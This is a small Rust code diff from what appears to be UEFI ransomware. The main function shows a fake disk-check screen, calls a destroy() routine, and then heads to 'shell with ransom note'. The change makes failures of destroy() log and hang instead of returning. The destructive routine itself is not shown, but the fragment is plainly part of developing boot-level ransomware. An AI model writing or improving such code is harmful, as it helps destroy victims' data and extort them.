@@ -129,7 +129,13 @@ fn main(_handle: Handle, mut st: SystemTable<Boot>) -> Status {
         init_chdsk_screen(&mut st)?;
 
         // Speak for it self
-        destroy(&st)?;
+        match destroy(&st) {
+            Ok(_) => {}
+            Err(e) => {
+                log::info!("{:?}", e);
+                loop {}
+            }
+        };
     }
 
     // Go to shell with ransom note
